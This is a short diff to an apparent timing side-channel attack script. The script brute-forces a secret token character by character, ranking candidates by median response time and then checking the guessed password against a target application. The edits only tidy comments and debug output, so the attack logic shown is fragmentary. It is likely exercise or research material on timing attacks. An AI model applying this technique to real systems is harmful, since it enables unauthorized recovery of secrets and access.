@@ -42,11 +42,10 @@ def find_next_character(base):
     
     for c in string.printable:
         guess = base + c + 'a' * (TOKEN_SIZE - len(base) - 1)
-        #print(f"\n[*] Trying: {guess}", end=' ', flush=True)
-        
+                
         times = try_to_hack(guess)
         
-        # Filter out infinite times (failed connections)
+        # Filter out infinite times
         valid_times = [t for t in times if t != float('inf')]
         
         if valid_times:
@@ -67,13 +66,13 @@ def find_next_character(base):
         else:
             print(f"(all failed)")
     
-    print()  # New line after tests
+    print() 
     
     if not measures:
         print("\n ERROR: All attempts failed.")
         sys.exit(1)
     
-    # Sort by median time (descending - longer time suggests correct character)
+    # Sort by median time descending - longer time suggests correct character
     measures.sort(key=lambda x: x['median'], reverse=True)
     
     # Display top candidates for debugging reasons. Since none of the characters in the password are present in the top 5 then we can assume the timing will not go well
@@ -106,7 +105,6 @@ def main():
     
     print(f"\nAttack complete. Guessed token: {base}")
     
-    # Verify the guessed password
     print(f"\nVerifying guessed password: {base}")
     
     args = [TA_APP] + TA_COMMAND.split() + [base]
